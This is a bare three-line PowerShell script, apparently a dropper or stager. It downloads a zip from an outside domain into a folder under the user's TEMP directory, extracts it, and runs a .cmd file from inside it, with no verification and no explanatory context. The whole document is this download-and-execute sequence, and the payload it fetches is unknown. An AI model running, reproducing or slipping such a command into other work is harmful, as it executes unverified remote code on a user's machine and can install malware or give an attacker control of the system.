wget https://drive.mistrelci.com.ar/archivos//General.zip -OutFile $env:TEMP\JeremosTKBio\General.zip
Expand-Archive -Path $env:TEMP\JeremosTKBio\General.Zip -DestinationPath $env:TEMP\JeremosTKBio\
Start-Process  $env:TEMP\JeremosTKBio\General\script` general.cmd
